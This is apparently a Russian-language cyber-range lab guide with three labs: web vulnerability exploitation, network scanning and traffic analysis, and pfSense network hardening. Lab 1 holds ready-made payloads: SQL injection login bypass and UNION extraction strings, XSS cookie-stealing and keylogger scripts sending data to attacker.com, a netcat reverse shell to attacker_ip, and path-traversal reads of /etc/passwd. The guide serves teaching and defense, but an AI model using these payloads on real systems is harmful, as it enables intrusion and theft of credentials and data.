# Лабораторные сценарии

Данный документ содержит детальные сценарии выполнения лабораторных работ в киберполигоне.

## Лабораторная работа №1: Веб-безопасность

### Цель
Изучить основные уязвимости веб-приложений и методы их эксплуатации.

### Теоретическая часть

#### 1.1 SQL Injection
SQL Injection - это уязвимость, позволяющая злоумышленнику выполнять произвольные SQL-запросы к базе данных приложения.

**Типы SQL Injection:**
- Union-based
- Boolean-based blind
- Time-based blind
- Error-based

#### 1.2 Cross-Site Scripting (XSS)
XSS позволяет внедрить вредоносный JavaScript код в веб-страницу.

**Типы XSS:**
- Reflected XSS
- Stored XSS  
- DOM-based XSS

#### 1.3 Command Injection
Позволяет выполнить системные команды на сервере.

### Практическая часть

#### Подготовка окружения

1. Создайте лабораторное окружение:
```bash
./scripts/deployment/create-student-env.sh create student001 web-security
```

2. Получите информацию о развернутых сервисах:
```bash
kubectl get pods -n student-student001
kubectl get services -n student-student001
```

3. Подключитесь к контейнеру с инструментами:
```bash
kubectl exec -it -n student-student001 deployment/attack-tools -- /bin/bash
```

#### Задание 1: SQL Injection

**Цель:** Обойти аутентификацию используя SQL Injection

**Шаги выполнения:**

1. Откройте веб-приложение в браузере
2. Перейдите на страницу `/login`
3. Попробуйте войти с обычными credentials: `admin/admin123`
4. Теперь попробуйте SQL Injection:
   - Username: `admin' OR '1'='1' --`
   - Password: `anything`

**Объяснение:**
Запрос в базе данных выглядит так:
```sql
SELECT * FROM users WHERE username='admin' OR '1'='1' --' AND password='anything'
```

Поскольку `'1'='1'` всегда истинно, а `--` комментирует остальную часть запроса, мы обходим проверку пароля.

**Дополнительные эксперименты:**
- Попробуйте извлечь данные: `admin' UNION SELECT 1,2,3 --`
- Определите структуру базы: `admin' UNION SELECT name, sql FROM sqlite_master --`

#### Задание 2: XSS (Cross-Site Scripting)

**Цель:** Выполнить JavaScript код в браузере другого пользователя

**Шаги выполнения:**

1. Перейдите на страницу `/search`
2. Введите поисковый запрос: `<script>alert('XSS!');</script>`
3. Нажмите "Search"
4. Наблюдайте выполнение JavaScript кода

**Усложненные варианты:**
- Cookie stealing: `<script>document.location='http://attacker.com/cookie.php?cookie='+document.cookie;</script>`
- Keylogger: `<script>document.onkeypress=function(e){new Image().src='http://attacker.com/log.php?key='+String.fromCharCode(e.which);}</script>`

#### Задание 3: Command Injection

**Цель:** Выполнить системные команды на сервере

**Шаги выполнения:**

1. Перейдите на страницу `/command`
2. Попробуйте выполнить: `ls -la`
3. Попробуйте: `id`
4. Попробуйте: `cat /etc/passwd`
5. Попробуйте цепочку команд: `ls -la; whoami; pwd`

**Дополнительные эксперименты:**
- Reverse shell: `nc -e /bin/bash attacker_ip 4444`
- Поиск интересных файлов: `find / -name "*.conf" 2>/dev/null`

#### Задание 4: Directory Traversal

**Цель:** Получить доступ к файлам за пределами веб-корня

**Шаги выполнения:**

1. Перейдите на страницу `/file`
2. Попробуйте прочитать: `app.py`
3. Попробуйте: `../../../etc/passwd`
4. Попробуйте: `../../../etc/hosts`
5. Попробуйте: `../../../proc/version`

### Защитные меры

Обсудите и реализуйте следующие защитные меры:

1. **Для SQL Injection:**
   - Prepared statements
   - Input validation
   - Least privilege принцип

2. **Для XSS:**
   - Output encoding
   - Content Security Policy
   - Input validation

3. **Для Command Injection:**
   - Input validation
   - Whitelist разрешенных команд
   - Использование безопасных API

4. **Для Directory Traversal:**
   - Path validation
   - Chroot jail
   - Принцип минимальных привилегий

### Отчет

Подготовьте отчет, включающий:
1. Скриншоты успешных атак
2. Анализ уязвимого кода
3. Рекомендации по защите
4. Демонстрацию исправленного кода

## Лабораторная работа №2: Сетевая безопасность

### Цель
Изучить методы сканирования сети, анализа трафика и обнаружения вторжений.

### Подготовка окружения

```bash
./scripts/deployment/create-student-env.sh create student002 network-security
```

### Задание 1: Сканирование сети

**Инструменты:** nmap, masscan

**Шаги:**

1. Подключитесь к контейнеру с инструментами:
```bash
kubectl exec -it -n student-student002 deployment/attack-tools -- /bin/bash
```

2. Проведите сканирование сети:
```bash
# Ping sweep
nmap -sn 192.168.0.0/24

# Port scan
nmap -sS -O 192.168.0.1-10

# Service detection
nmap -sV -sC 192.168.0.1

# UDP scan
nmap -sU --top-ports 100 192.168.0.1
```

3. Анализируйте результаты и создайте карту сети

### Задание 2: Анализ трафика

**Инструменты:** tcpdump, wireshark, tshark

**Шаги:**

1. Захват трафика:
```bash
# Захват всего трафика
tcpdump -i any -w capture.pcap

# Захват HTTP трафика
tcpdump -i any port 80 -w http.pcap

# Анализ с tshark
tshark -r capture.pcap -Y "http.request.method == GET"
```

2. Анализ:
   - Найдите незашифрованные пароли
   - Определите используемые протоколы
   - Найдите подозрительный трафик

### Задание 3: Настройка IDS

**Инструменты:** Suricata, Snort

1. Настройте правила обнаружения
2. Сгенерируйте тестовые атаки
3. Проанализируйте алерты

### Отчет по лабораторной №2

1. Карта сканированной сети
2. Анализ захваченного трафика  
3. Настроенные правила IDS
4. Рекомендации по защите

## Лабораторная работа №3: Построение защищенной корпоративной сети

### Цель
Научиться проектировать и настраивать защищенную корпоративную сеть с использованием pfSense.

### Сценарий
Вы - сетевой администратор, которому поручено построить защищенную сеть для компании с офисом и филиалом.

### Требования к сети:
- Офис (Office): 192.168.10.0/24
- Филиал (Branch): 192.168.20.0/24  
- DMZ: 192.168.30.0/24
- Управление: 192.168.100.0/24

### Задание 1: Настройка VLAN и сегментация

1. Войдите в веб-интерфейс pfSense
2. Создайте VLAN:
   - VLAN 10 - Office
   - VLAN 20 - Branch
   - VLAN 30 - DMZ
   - VLAN 100 - Management

3. Настройте интерфейсы для каждого VLAN

### Задание 2: Настройка Firewall правил

1. Создайте правила для Office VLAN:
   - Разрешить доступ в интернет
   - Разрешить доступ к DMZ серверам
   - Запретить доступ к другим VLAN

2. Создайте правила для DMZ:
   - Разрешить входящие подключения из интернета на 80,443
   - Запретить доступ к внутренним сетям

### Задание 3: Настройка VPN

1. Настройте IPSec туннель между офисом и филиалом
2. Проверьте связность между сетями
3. Настройте OpenVPN для удаленных пользователей

### Задание 4: Мониторинг и логирование

1. Включите логирование firewall
2. Настройте отправку логов в Grafana
3. Создайте дашборд для мониторинга

### Результат
В конце лабораторной у вас должна быть полностью функциональная защищенная корпоративная сеть с мониторингом.

## Критерии оценки

### Лабораторная №1 (Веб-безопасность):
- Успешная эксплуатация всех уязвимостей (40%)
- Понимание принципов атак (20%)
- Качество отчета (20%)
- Предложенные защитные меры (20%)

### Лабораторная №2 (Сетевая безопасность):
- Полнота сканирования сети (25%)
- Качество анализа трафика (25%)
- Настройка IDS (25%)
- Отчет и рекомендации (25%)

### Лабораторная №3 (Построение сети):
- Правильность сегментации (30%)
- Настройка firewall (30%)
- Работоспособность VPN (25%)
- Мониторинг (15%)

## Дополнительные задания

### Для продвинутых студентов:

1. **Автоматизация атак**
   - Напишите скрипт для автоматической эксплуатации SQL Injection
   - Создайте инструмент для массового сканирования

2. **Blue Team активности**
   - Настройте SIEM для обнаружения атак
   - Создайте incident response playbook

3. **Разработка эксплойтов**
   - Найдите новую уязвимость в предоставленном приложении
   - Разработайте proof-of-concept эксплойт

## Ресурсы для изучения

- OWASP Top 10
- NIST Cybersecurity Framework
- SANS Reading Room
- Документация pfSense
- Kubernetes Security Best Practices